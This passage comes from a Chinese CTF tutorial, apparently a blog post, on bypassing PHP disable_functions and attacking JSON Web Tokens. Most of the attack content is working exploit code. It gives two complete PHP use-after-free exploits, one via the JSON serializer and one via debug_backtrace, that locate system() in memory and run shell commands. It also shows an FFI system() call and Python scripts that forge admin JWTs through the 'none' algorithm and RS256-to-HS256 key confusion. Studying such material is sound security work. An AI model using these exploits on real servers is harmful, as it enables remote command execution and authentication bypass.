                $data_size = $p_memsz;
            } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec
                $text_size = $p_memsz;
            }
        }

        if(!$data_addr || !$text_size || !$data_size)
            return false;

        return [$data_addr, $text_size, $data_size];
    }

    public function get_basic_funcs($base, $elf) {
        list($data_addr, $text_size, $data_size) = $elf;
        for($i = 0; $i < $data_size / 8; $i++) {
            $leak = $this->leak2($data_addr, $i * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = $this->leak2($leak);
                # 'constant' constant check
                if($deref != 0x746e6174736e6f63)
                    continue;
            } else continue;

            $leak = $this->leak2($data_addr, ($i + 4) * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = $this->leak2($leak);
                # 'bin2hex' constant check
                if($deref != 0x786568326e6962)
                    continue;
            } else continue;

            return $data_addr + $i * 8;
        }
    }

    public function get_binary_base($binary_leak) {
        $base = 0;
        $start = $binary_leak & 0xfffffffffffff000;
        for($i = 0; $i < 0x1000; $i++) {
            $addr = $start - 0x1000 * $i;
            $leak = $this->leak2($addr, 0, 7);
            if($leak == 0x10102464c457f) { # ELF header
                return $addr;
            }
        }
    }

    public function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = $this->leak2($addr);
            $f_name = $this->leak2($f_entry, 0, 6);

            if($f_name == 0x6d6574737973) { # system
                return $this->leak2($addr + 8);
            }
            $addr += 0x20;
        } while($f_entry != 0);
        return false;
    }

    public function jsonSerialize() {
        global $y, $cmd, $spl1, $fake_tbl_off, $n_alloc;

        $contiguous = [];
        for($i = 0; $i < $n_alloc; $i++)
            $contiguous[] = new DateInterval('PT1S');

        $room = [];
        for($i = 0; $i < $n_alloc; $i++)
            $room[] = new Z();

        $_protector = $this->ptr2str(0, 78);

        $this->abc = $this->ptr2str(0, 79);
        $p = new DateInterval('PT1S');

        unset($y[0]);
        unset($p);

        $protector = ".$_protector";

        $x = new DateInterval('PT1S');
        $x->d = 0x2000;
        $x->h = 0xdeadbeef;
        # $this->abc is now of size 0x2000

        if($this->str2ptr($this->abc) != 0xdeadbeef) {
            die('UAF failed.');
        }

        $spl1 = new MySplFixedArray();
        $spl2 = new MySplFixedArray();

        # some leaks
        $class_entry = $this->str2ptr($this->abc, 0x120);
        $handlers = $this->str2ptr($this->abc, 0x128);
        $php_heap = $this->str2ptr($this->abc, 0x1a8);
        $abc_addr = $php_heap - 0x218;

        # create a fake class_entry
        $fake_obj = $abc_addr;
        $this->write($this->abc, 0, 2); # type
        $this->write($this->abc, 0x120, $abc_addr); # fake class_entry

        # copy some of class_entry definition
        for($i = 0; $i < 16; $i++) {
            $this->write($this->abc, 0x10 + $i * 8, 
                $this->leak1($class_entry + 0x10 + $i * 8));
        }

        # fake static members table
        $fake_tbl_off = 0x70 * 4 - 16;
        $this->write($this->abc, 0x30, $abc_addr + $fake_tbl_off);
        $this->write($this->abc, 0x38, $abc_addr + $fake_tbl_off);

        # fake zval_reference
        $this->write($this->abc, $fake_tbl_off, $abc_addr + $fake_tbl_off + 0x10); # zval
        $this->write($this->abc, $fake_tbl_off + 8, 10); # zval type (reference)

        # look for binary base
        $binary_leak = $this->leak2($handlers + 0x10);
        if(!($base = $this->get_binary_base($binary_leak))) {
            die("Couldn't determine binary base address");
        }

        # parse elf header
        if(!($elf = $this->parse_elf($base))) {
            die("Couldn't parse ELF");
        }

        # get basic_functions address
        if(!($basic_funcs = $this->get_basic_funcs($base, $elf))) {
            die("Couldn't get basic_functions address");
        }

        # find system entry
        if(!($zif_system = $this->get_system($basic_funcs))) {
            die("Couldn't get zif_system address");
        }
        
        # copy hashtable offsetGet bucket
        $fake_bkt_off = 0x70 * 5 - 16;

        $function_data = $this->str2ptr($this->abc, 0x50);
        for($i = 0; $i < 4; $i++) {
            $this->write($this->abc, $fake_bkt_off + $i * 8, 
                $this->leak2($function_data + 0x40 * 4, $i * 8));
        }

        # create a fake bucket
        $fake_bkt_addr = $abc_addr + $fake_bkt_off;
        $this->write($this->abc, 0x50, $fake_bkt_addr);
        for($i = 0; $i < 3; $i++) {
            $this->write($this->abc, 0x58 + $i * 4, 1, 4);
        }

        # copy bucket zval
        $function_zval = $this->str2ptr($this->abc, $fake_bkt_off);
        for($i = 0; $i < 12; $i++) {
            $this->write($this->abc,  $fake_bkt_off + 0x70 + $i * 8, 
                $this->leak2($function_zval, $i * 8));
        }

        # pwn
        $this->write($this->abc, $fake_bkt_off + 0x70 + 0x30, $zif_system);
        $this->write($this->abc, $fake_bkt_off, $fake_bkt_addr + 0x70);

        $spl1->offsetGet($cmd);

        exit();
    }
}

$y = [new Z()];
json_encode([&$y]);
```
![](https://img-blog.csdnimg.cn/20201009182938672.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)
![](https://img-blog.csdnimg.cn/20201009182953116.png#pic_center)

参考：
[Bug #77843 	Use after free with json serializer](https://bugs.php.net/bug.php?id=77843)
[php-json-bypass](https://github.com/mm0r1/exploits/blob/master/php-json-bypass/exploit.php)

#### Backtrace UAF
>php版本：
7.0 - all versions to date
7.1 - all versions to date
7.2 - all versions to date
7.3 < 7.3.15 (released 20 Feb 2020)
7.4 < 7.4.3 (released 20 Feb 2020)

绕过脚本如下：
```php
<?php

# PHP 7.0-7.4 disable_functions bypass PoC (*nix only)
#
# Bug: https://bugs.php.net/bug.php?id=76047
# debug_backtrace() returns a reference to a variable 
# that has been destroyed, causing a UAF vulnerability.
#
# This exploit should work on all PHP 7.0-7.4 versions
# released as of 30/01/2020.
#
# Author: https://github.com/mm0r1

pwn("uname -a");

function pwn($cmd) {
    global $abc, $helper, $backtrace;

    class Vuln {
        public $a;
        public function __destruct() { 
            global $backtrace; 
            unset($this->a);
            $backtrace = (new Exception)->getTrace(); # ;)
            if(!isset($backtrace[1]['args'])) { # PHP >= 7.4
                $backtrace = debug_backtrace();
            }
        }
    }

    class Helper {
        public $a, $b, $c, $d;
    }

    function str2ptr(&$str, $p = 0, $s = 8) {
        $address = 0;
        for($j = $s-1; $j >= 0; $j--) {
            $address <<= 8;
            $address |= ord($str[$p+$j]);
        }
        return $address;
    }

    function ptr2str($ptr, $m = 8) {
        $out = "";
        for ($i=0; $i < $m; $i++) {
            $out .= chr($ptr & 0xff);
            $ptr >>= 8;
        }
        return $out;
    }

    function write(&$str, $p, $v, $n = 8) {
        $i = 0;
        for($i = 0; $i < $n; $i++) {
            $str[$p + $i] = chr($v & 0xff);
            $v >>= 8;
        }
    }

    function leak($addr, $p = 0, $s = 8) {
        global $abc, $helper;
        write($abc, 0x68, $addr + $p - 0x10);
        $leak = strlen($helper->a);
        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }
        return $leak;
    }

    function parse_elf($base) {
        $e_type = leak($base, 0x10, 2);

        $e_phoff = leak($base, 0x20);
        $e_phentsize = leak($base, 0x36, 2);
        $e_phnum = leak($base, 0x38, 2);

        for($i = 0; $i < $e_phnum; $i++) {
            $header = $base + $e_phoff + $i * $e_phentsize;
            $p_type  = leak($header, 0, 4);
            $p_flags = leak($header, 4, 4);
            $p_vaddr = leak($header, 0x10);
            $p_memsz = leak($header, 0x28);

            if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write
                # handle pie
                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
                $data_size = $p_memsz;
            } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec
                $text_size = $p_memsz;
            }
        }

        if(!$data_addr || !$text_size || !$data_size)
            return false;

        return [$data_addr, $text_size, $data_size];
    }

    function get_basic_funcs($base, $elf) {
        list($data_addr, $text_size, $data_size) = $elf;
        for($i = 0; $i < $data_size / 8; $i++) {
            $leak = leak($data_addr, $i * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                # 'constant' constant check
                if($deref != 0x746e6174736e6f63)
                    continue;
            } else continue;

            $leak = leak($data_addr, ($i + 4) * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                # 'bin2hex' constant check
                if($deref != 0x786568326e6962)
                    continue;
            } else continue;

            return $data_addr + $i * 8;
        }
    }

    function get_binary_base($binary_leak) {
        $base = 0;
        $start = $binary_leak & 0xfffffffffffff000;
        for($i = 0; $i < 0x1000; $i++) {
            $addr = $start - 0x1000 * $i;
            $leak = leak($addr, 0, 7);
            if($leak == 0x10102464c457f) { # ELF header
                return $addr;
            }
        }
    }

    function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = leak($addr);
            $f_name = leak($f_entry, 0, 6);

            if($f_name == 0x6d6574737973) { # system
                return leak($addr + 8);
            }
            $addr += 0x20;
        } while($f_entry != 0);
        return false;
    }

    function trigger_uaf($arg) {
        # str_shuffle prevents opcache string interning
        $arg = str_shuffle(str_repeat('A', 79));
        $vuln = new Vuln();
        $vuln->a = $arg;
    }

    if(stristr(PHP_OS, 'WIN')) {
        die('This PoC is for *nix systems only.');
    }

    $n_alloc = 10; # increase this value if UAF fails
    $contiguous = [];
    for($i = 0; $i < $n_alloc; $i++)
        $contiguous[] = str_shuffle(str_repeat('A', 79));

    trigger_uaf('x');
    $abc = $backtrace[1]['args'][0];

    $helper = new Helper;
    $helper->b = function ($x) { };

    if(strlen($abc) == 79 || strlen($abc) == 0) {
        die("UAF failed");
    }

    # leaks
    $closure_handlers = str2ptr($abc, 0);
    $php_heap = str2ptr($abc, 0x58);
    $abc_addr = $php_heap - 0xc8;

    # fake value
    write($abc, 0x60, 2);
    write($abc, 0x70, 6);

    # fake reference
    write($abc, 0x10, $abc_addr + 0x60);
    write($abc, 0x18, 0xa);

    $closure_obj = str2ptr($abc, 0x20);

    $binary_leak = leak($closure_handlers, 8);
    if(!($base = get_binary_base($binary_leak))) {
        die("Couldn't determine binary base address");
    }

    if(!($elf = parse_elf($base))) {
        die("Couldn't parse ELF header");
    }

    if(!($basic_funcs = get_basic_funcs($base, $elf))) {
        die("Couldn't get basic_functions address");
    }

    if(!($zif_system = get_system($basic_funcs))) {
        die("Couldn't get zif_system address");
    }

    # fake closure object
    $fake_obj_offset = 0xd0;
    for($i = 0; $i < 0x110; $i += 8) {
        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
    }

    # pwn
    write($abc, 0x20, $abc_addr + $fake_obj_offset);
    write($abc, 0xd0 + 0x38, 1, 4); # internal func type
    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler

    ($helper->b)($cmd);
    exit();
}
```
![](https://img-blog.csdnimg.cn/20201009183651506.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)

![](https://img-blog.csdnimg.cn/20201009183715753.png#pic_center)

参考：
[php7-backtrace-bypass](https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php)
[Bug #76047 	Use-after-free when accessing already destructed backtrace arguments](https://bugs.php.net/bug.php?id=76047)

#### FFI 扩展
>PHP >= 7.4
开启了 FFI 扩展且 ffi.enable=true

```
[ffi]
; FFI API restriction. Possible values:
; "preload" - enabled in CLI scripts and preloaded files (default)
; "false"   - always disabled
; "true"    - always enabled
ffi.enable=true

; List of headers files to preload, wildcard patterns allowed.
;ffi.preload=
```
写入php代码如下：
```php
<?php
$ffi = FFI::cdef("int system(const char *command);");
$ffi->system("whoami > /tmp/123");
echo file_get_contents("/tmp/123");
@unlink("/tmp/123");
```
![](https://img-blog.csdnimg.cn/20201009184632826.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)

![](https://img-blog.csdnimg.cn/20201009184559678.png#pic_center)

参考：
[PHP FFI详解 - 一种全新的PHP扩展方式](https://www.laruence.com/2020/03/11/5475.html)
[AntSword-Labs](https://github.com/AntSwordProject/AntSword-Labs)

## JSON Web Token
### 基础知识
[JWT基础知识](https://www.wolai.com/ctfhub/hcFRbVUSwDUD1UTrPJbkob)
[JSON Web Token 入门教程](https://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html)

可利用工具：[https://jwt.io/](https://jwt.io/)
### 敏感信息泄露
>JWT的头部和有效载荷这两部分的数据是以明文形式传输的，如果其中包含了敏感信息的话，就会发生敏感信息泄露。

题目很明了的表示flag在JWT内，那么首先随便登录一个账号，然后查看Cookie
![](https://img-blog.csdnimg.cn/20210503194534675.png)
直接解密即可得到flag
![](https://img-blog.csdnimg.cn/20210503194708785.png)
### 无签名
>一些JWT库也支持none算法，即不使用签名算法。当alg字段为空时，后端将不执行签名验证。
**将secret置空。利用node的jsonwentoken库已知缺陷：当jwt的secret为null或undefined时，jsonwebtoken会采用algorithm为none进行验证**
因为alg为none,所以只要把signature设置为空（即不添加signature字段），提交到服务器，token都可以通过服务器的验证

将alg修改为none后，去掉JWT中的signature数据`(仅剩header + '.' + payload + '.')`然后提交到服务端即可
这里写一个jwt脚本，需要安装PyJWT
```python
import jwt

payload={
  "username": "admin",
  "password": "admin",
  "role": "admin"
}
token = jwt.encode(payload,algorithm="none",key="")
print(token)
```
![](https://img-blog.csdnimg.cn/20210503202759156.png)

传入即可得到flag
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.
```

### 弱密钥
>如果JWT采用对称加密算法，并且密钥的强度较弱的话，攻击者可以直接通过蛮力攻击方式来破解密钥

不过对JWT的密钥爆破需要在一定的前提下进行：
- 知悉JWT使用的加密算法
- 一段有效的、已签名的token
- 签名用的密钥不复杂（弱密钥）

使用工具：[https://github.com/brendan-rius/c-jwt-cracker](https://github.com/brendan-rius/c-jwt-cracker)
首先需要安装`apt-get install libssl-dev`，然后`make`一下即可
![](https://img-blog.csdnimg.cn/20210503203836230.png)
使用jwtcrack得到密钥`wlps`
![](https://img-blog.csdnimg.cn/20210503203928889.png)
传入即可
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IjExMSIsInBhc3N3b3JkIjoiMTExIiwicm9sZSI6ImFkbWluIn0.SRR18Uf-D6tRkClsuDGX3VMTf0-YJ1hIkTQAjg0M9RU
```

### 修改签名算法
>有些JWT库支持多种密码算法进行签名、验签。若目标使用非对称密码算法时，有时攻击者可以获取到公钥，此时可通过修改JWT头部的签名算法，将非对称密码算法改为对称密码算法，从而达到攻击者目的

`HMAC`是密钥相关的哈希运算消息认证码（Hash-based Message Authentication Code）的缩写，它是一种对称加密算法，使用相同的密钥对传输信息进行加解密

`RSA`则是一种非对称加密算法，使用私钥加密明文，公钥解密密文
本题给出了源码：
```php
<?php
require __DIR__ . '/vendor/autoload.php';
use \Firebase\JWT\JWT;

class JWTHelper {
  public static function encode($payload=array(), $key='', $alg='HS256') {
    return JWT::encode($payload, $key, $alg);
  }
  public static function decode($token, $key, $alg='HS256') {
    try{
            $header = JWTHelper::getHeader($token);
            $algs = array_merge(array($header->alg, $alg));
      return JWT::decode($token, $key, $algs);
    } catch(Exception $e){
      return false;
    }
    }
    public static function getHeader($jwt) {
        $tks = explode('.', $jwt);
        list($headb64, $bodyb64, $cryptob64) = $tks;
        $header = JWT::jsonDecode(JWT::urlsafeB64Decode($headb64));
        return $header;
    }
}

$FLAG = getenv("FLAG");
$PRIVATE_KEY = file_get_contents("/privatekey.pem");
$PUBLIC_KEY = file_get_contents("./publickey.pem");

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!empty($_POST['username']) && !empty($_POST['password'])) {
        $token = "";
        if($_POST['username'] === 'admin' && $_POST['password'] === $FLAG){
            $jwt_payload = array(
                'username' => $_POST['username'],
                'role'=> 'admin',
            );
            $token = JWTHelper::encode($jwt_payload, $PRIVATE_KEY, 'RS256');
        } else {
            $jwt_payload = array(
                'username' => $_POST['username'],
                'role'=> 'guest',
            );
            $token = JWTHelper::encode($jwt_payload, $PRIVATE_KEY, 'RS256');
        }
        @setcookie("token", $token, time()+1800);
        header("Location: /index.php");
        exit();
    } else {
        @setcookie("token", "");
        header("Location: /index.php");
        exit();
    }
} else {
    if(!empty($_COOKIE['token']) && JWTHelper::decode($_COOKIE['token'], $PUBLIC_KEY) != false) {
        $obj = JWTHelper::decode($_COOKIE['token'], $PUBLIC_KEY);
        if ($obj->role === 'admin') {
            echo $FLAG;
        }
    } else {
        show_source(__FILE__);
    }
}
?>
```
发现加密密钥为RS256，但又存在HS256，即可修改算法RS256为HS256(非对称密码算法 => 对称密码算法)，如果将算法从RS256更改为HS256，后端代码会使用公钥作为秘密密钥，然后使用HS256算法验证签名
题目给出了publickey.pem：
```
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA4cuKT+r5gDWNEvdhqAhF
qPWuELo9aWgxA7rV1otibibLhcD6rRMInWuUaAhBdnRF9KoZxVD6SflWbo2J+Lzb
y8AmqfYz0bDiSHu+OdRCO+NKwLLTeLKIQXSjTgj76dBRYScEaKyH8KpuMj7ESUaC
yBVmAboSbFlaoXEC1hTg5YLZEu+fxrqWwrqaD8Jy2en4jCV+hR7voJkDdWXcGpRy
eNm2VialkPul32H8DY1B/TNQ17SxJjfA0ODfWTnTathS1UmvKTd+3+f66IkV8ZBp
UDCwfNcNPZW1sMK5GYoPdJ20KP3HEMGaBbySwcbU/GgJg9lWDTUGHs6eXHxwDIko
HwIDAQAB
-----END PUBLIC KEY-----
```
写脚本进行HS256加密
```python
import jwt
import base64
public = '''-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA4cuKT+r5gDWNEvdhqAhF
qPWuELo9aWgxA7rV1otibibLhcD6rRMInWuUaAhBdnRF9KoZxVD6SflWbo2J+Lzb
y8AmqfYz0bDiSHu+OdRCO+NKwLLTeLKIQXSjTgj76dBRYScEaKyH8KpuMj7ESUaC
yBVmAboSbFlaoXEC1hTg5YLZEu+fxrqWwrqaD8Jy2en4jCV+hR7voJkDdWXcGpRy
eNm2VialkPul32H8DY1B/TNQ17SxJjfA0ODfWTnTathS1UmvKTd+3+f66IkV8ZBp
UDCwfNcNPZW1sMK5GYoPdJ20KP3HEMGaBbySwcbU/GgJg9lWDTUGHs6eXHxwDIko
HwIDAQAB
-----END PUBLIC KEY-----
'''
payload={
  "username": "admin",
  "role": "admin"
}
print(jwt.encode(payload, key=public, algorithm='HS256'))
```

![](https://img-blog.csdnimg.cn/20210503214939127.png)
可参考文章：[2018CUMTCTF-Final-Web](https://skysec.top/2018/05/19/2018CUMTCTF-Final-Web/#Pastebin/)
